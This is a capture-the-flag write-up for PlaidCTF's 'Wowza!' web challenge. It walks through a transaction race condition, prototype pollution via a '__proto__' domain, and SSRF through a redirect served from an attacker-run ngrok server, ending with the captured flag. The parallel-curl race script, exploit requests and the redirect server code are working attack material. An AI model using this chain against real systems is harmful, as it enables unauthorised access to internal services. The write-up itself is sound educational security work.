# Wowza!

## Prompt

Director: zwad3

Cast: bluepichu

Once the pinnacle of the 20th century tech industry, now a defunct relic of the past. Meet the people behind the rise and fall of a search engine giant in the new documentary, Wowza!

Episodes
Search & Destroy (350 points): Sessions on the remote server are limited to 15 minutes per attempt. You should first develop an exploit locally, and then try it on the server.

## Enumeration

We have two web servers in two separate containers. One is the search console which allows domains to be added, validated, then scraped.  The second allows searching the scraped database via API requests to the first.  Looking through the code, we find we can retrieve the flag via an SSRF in `index.ts`:

```js
// Let's just call a spade a spade, shall we?
const ssrfTarget = express();
ssrfTarget.get("/flag.txt", (req, res) => {
    if (req.hostname !== "localhost") {
        return res.status(401).send(">:(");
    }

    res.send(FLAG);
});
ssrfTarget.listen(1337, "127.0.0.1");
```

Let's work backwards, starting with the SSRF target, and see if we can find a way to send a server side request from within the site search container.

## SSRF

The only obvious code that makes a request is the refetch in `client.ts`:

```js
const results = await fetch(new URL("/search", consoleUrl), {
    headers: {
        "Content-Type": "application/json",
    },
    method: "POST",
    body: JSON.stringify({ domain, query: tokens }),
});

const searchResults: Result[] = await results.json();
console.log(`Results ${JSON.stringify(searchResults, null, 2)}`);
const patched = await Promise.all(
    searchResults
        .map(async (result) => {
            if (result.isStale) {
                const pageUrl = new URL(result.path, "http://" + domain);
                try {
                    const refetch = await fetch(pageUrl); // <|---- SSRF HERE?
                    const body = await refetch.text();
                    result.description = getBody(body).join(" ").trim();
                } catch (e) {
                    // pass
                }
            }

            return result;
        })
);
```

Looks like for this refetch to take place, we need the `/search` route on the search console to return results, and one of those results needs to have the `isStale` property set.  After using the search console and site search UIs, it's easy enough to add a site, validate it, scrape it, and then search it to have valid results.  However, searching the code base for `isStale` yields zero results outside this reference in `client.ts`.  Looking at the `/search` handler in the search console doesn't yield any obvious way to set `isStale` either. Perhaps if there was prototype pollution we could get every result to be stale.  Let's take a look and see what we can find.

## Prototype Pollution

Looking at the code in `client.ts`, right after the search results request and processing, we find the following:

```js
  const domainCache = cache[domain] ?? {};
  domainCache[query] = patched;
  cache[domain] = domainCache;
```

If `domain` were set to `__proto__`, then we could set whatever property we like on `{}.__proto__`, which is `Object.prototype`, so every newly created object would have the property.  So if we were to set the `query` to `isStale`, every newly created object would have an `isStale` property with a value of `patched`.  The `patched` value comes from the same code we're trying to exploit for our SSRF:

```js
const results = await fetch(new URL("/search", consoleUrl), {
    headers: {
        "Content-Type": "application/json",
    },
    method: "POST",
    body: JSON.stringify({ domain, query: tokens }),
});

const patched = await Promise.all(
      searchResults
          .map(async (result) => {
              if (result.isStale) {
                  const pageUrl = new URL(result.path, "http://" + domain);
                  try {
                      const refetch = await fetch(pageUrl);
                      const body = await refetch.text();
                      result.description = getBody(body).join(" ").trim();
                  } catch (e) {
                      // pass
                  }
              }

              return result;
          })
  );
```

`Promise.all` returns a series of results in an array, and even if the array is empty, that's still truthy, which is good news.  However, some testing with the `/search` route reveals that it returns a `500` status if the domain hasn't been added and validated:

```shell-session
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ curl -v http://wowza.pwni.ng:6284/search -H "Content-Type: application/json" --data '{"domain":"wowza.2r.is","query":["whatever"]}'
*   Trying wowza.pwni.ng:6284...
* Connected to wowza.pwni.ng (wowza.pwni.ng) port 6284 (#0)
> POST /search HTTP/1.1
> Host: wowza.pwni.ng:6284
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 62
> 
* upload completely sent off: 62 out of 62 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 32
< ETag: W/"20-cI8B1wZuBEyTE5ClDvphKZx7wd0"
< Date: Sat, 24 Apr 2021 22:45:38 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
* Connection #0 to host wowza.pwni.ng left intact
{"error":"Something went wrong"}
```

This will throw an exception, so in order to hit the necessary code for prototype pollution, we're going to have to get `__proto__` inserted into the search console database as a valid domain/site.

## Searching Search Console (Race Condition)

Enumerating the code for the search console and the places where the database is accessed doesn't yield any obvious SQL injection or poor input sanitization, but there was some suspicious code that stood out related to validating pending sites.  In `database.ts` there's some code for transactions:

```js
export const transaction = async <T>(callback: () => Awaitable<T>) => {
    try {
        await query`begin;`;
        const result = await callback();
        await query`commit;`;
        return result;
    } catch (e) {
        await query`rollback;`;
        throw e;
    }
}
```

and this is used by the `validateSite` function in `site.ts`:

```js
export const validateSite = async (username: string, domain: string, validation_code: string) => {
    await transaction(async () => {
        const pendingSitePromise = query<PendingSite>`
                SELECT * FROM pending_site
                WHERE domain = ${domain}
                    AND username = ${username}
                    AND validation_code = ${validation_code};`
            .then((validationResults) => {
                if (validationResults.length !== 1) {
                    throw new SafeError(401, "Invalid validation code");
                };
            })
            .then(() => query`
                DELETE FROM pending_site
                WHERE domain = ${domain};
            `);

        const siteInsertPromise = query`
            INSERT INTO site (domain, pages, indices)
            VALUES (${domain}, ${JSON.stringify([])}, ${JSON.stringify([])});
        `;

        const ownershipInsertPromise = query`
            INSERT INTO user_site_ownership (username, domain)
            VALUES (${username}, ${domain});
        `;

        const results = await Promise.allSettled([pendingSitePromise, siteInsertPromise, ownershipInsertPromise]);
        assertAllSettled(results);
    })
}
```

So it would seem that the validated site insertion, pending site validation and removal, and site ownership insertion, all happen simultaneously and asynchronously as part of a transaction that can be rolled back.  If we could line up two requests in just the right way, perhaps we could get a `rollback` from a second request in before the site insertion.  It would go something like this:

```SQL
-- /site/validate/ request 1 begins
begin;
-- /site/validate/ request 2 begins
begin; -- request 2 begin fails
rollback; -- request 2 failed so rollback is executed but ends the transaction for request 1's begin
-- request 2 ends
INSERT INTO site (domain, pages, indices) VALUES ('__proto__','[]','[]')
INSERT INTO user_site_ownership (username, domain) VALUES ('admin','__proto__')
SELECT * FROM pending_site WHERE domain = '__proto__' AND username = 'admin' AND validation_code = 'whatever'; -- This fails and triggers another rollback
rollback; -- From request 1 but it fails, and __proto__ is now in the sites table and validated
-- request 1 ends
```

So we can now insert any domain as a validated one.  We now have one last hurdle...

## localhost:1337 (redirect)

The last hurdle to get past is the check for `localhost` on the SSRF target:

```js
// Let's just call a spade a spade, shall we?
const ssrfTarget = express();
ssrfTarget.get("/flag.txt", (req, res) => {
    if (req.hostname !== "localhost") {
        return res.status(401).send(">:(");
    }

    res.send(FLAG);
});
ssrfTarget.listen(1337, "127.0.0.1");
```

We can't just add `localhost:1337` as the domain and scrape it as there's no `/flag.txt` route that would get refetched.  However, we should be able to add our own domain, let the search console scrape it, and then have it serve up a redirect to `localhost:1337` for the refetch.

## Piecing It All Together

### Race Condition

We now have all of the ingredients, so let's code up something to attempt the race condition.  A little testing shows that lots of requests via `curl` works, so we'll start with that.  We'll need a session cookie from the app, the registered domain(via the UI or curl), and the url.

```bash
#!/bin/bash

for i in {0..10}
do
  curl "$1/site/validate" \
    -H 'Content-Type: application/json' \
    -H "Cookie: user_token=$2" \
    --data-raw "{\"domain\":\"$3\"}" &
done
```

Lets try it out:

```shell
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ ./validate-race.sh http://wowza.pwni.ng:6284 a05c8268-8f89-45b3-8095-4736f583a762 __proto__
{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}{"error":"Something went wrong"}
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ curl 'http://wowza.pwni.ng:6284/site/' -H 'Cookie: user_token=a05c8268-8f89-45b3-8095-4736f583a762'
[{"domain":"__proto__","pending":false},{"domain":"__proto__","pending":true,"validationCode":"VALID"}]
```

Note that `VALID` as the validation code is a temporary change we made to the code for testing purposes.  It would seem we were successful since `pending` is `false`.  While we're at it, let's go ahead and add our own validated domain that can be scraped, something like an ngrok url that forwards to a locally running [server](https://github.com/zoeyg/sec/blob/master/tools/simple-http-server.js) that we can modify as needed.  We can register the site through the UI, and then use our script to validate it.  We could also alternatively just use a valid domain we own.

### Prototype Pollution

Now we need to run a query on the site search server to achieve the prototype pollution.  You can do it through the UI, or via the command line:

```shell
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ curl 'http://wowza.pwni.ng:6285/?domain=__proto__&q=isStale'
<html>
    <head>
        <!-- I submit for your consideration that this is not an XSS problem -->
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;1,100;1,300;1,400;1,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/static/main.css">
        <script src="/static/main.js"></script>
    </head>
    <body>
        <div class="content">
            <div class="head">
                <div class="logo">Wowza!</div>
                <div class="search-bar">
                    <input type="text" id="domain-search" placeholder="Domain">
                    <div class="divider"></div>
                    <input type="text" id="query-search" placeholder="Query">
                </div>
            </div>
            <div class="result-list"></div>
        </div>
    </body>
</html>
```

If things went properly, the request to the search console for the `__proto__` domain and site should have worked, and `isStale` should have been polluted with a value of `[]`, which is truthy.  So now when you make a search on any valid domain that returns a result, there should be a refetch.  When we run the following search:

```shell
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ curl 'http://wowza.pwni.ng:6285/?domain=81b70181c396.ngrok.io&q=index'                                 
<html>
<!-- ... -->
  <div class="result-list">
    <div class="result">
      <a class="link" href="http://81b70181c396.ngrok.io/" target="__blank">/</a>
      <div class="description">
          WOWZA INDEX CONTENT1 CONTENT2 CONTENT3 CONTENT4 CONTENT5
      </div>
    </div>
    </div>
  </div>
</body>
</html>
```

We get the refetch request on our server:

```http
20:28:28: GET /
        Accept: */*
        User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)
        Accept-Encoding: gzip,deflate
        Connection: close
        Host: 81b70181c396.ngrok.io
        X-Forwarded-For: 136.24.87.102
```

### Redirect

Now all that's left should be changing up our local server to serve up a redirect rather than something with content we can search.  Something like:

```js
const express = require("express");
const app = express();
// app.use(express.static('.'));
app.all("/", (req, res) => {
  res.redirect("http://localhost:1337/flag.txt");
});
app.listen(port, () => console.log(`exfil and tools server listening on port ${port}!`));
```

And lets run the search again:

```html
╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
╰─$ curl 'http://wowza.pwni.ng:6285/?domain=81b70181c396.ngrok.io&q=wowza'
<html>
    <head>
        <!-- I submit for your consideration that this is not an XSS problem -->
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;1,100;1,300;1,400;1,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/static/main.css">
        <script src="/static/main.js"></script>
    </head>
    <body>
        <div class="content">
            <div class="head">
                <div class="logo">Wowza!</div>
                <div class="search-bar">
                    <input type="text" id="domain-search" placeholder="Domain">
                    <div class="divider"></div>
                    <input type="text" id="query-search" placeholder="Query">
                </div>
            </div>
            <div class="result-list">
<div class="result">
    <a class="link" href="http://81b70181c396.ngrok.io/" target="__blank">/</a>
    <div class="description">
        PCTF{i_found_another_immutable_bug_while_writing_this_problem}}
    </div>
</div>
    </div>
        </div>
    </body>
</html>
```

Success!
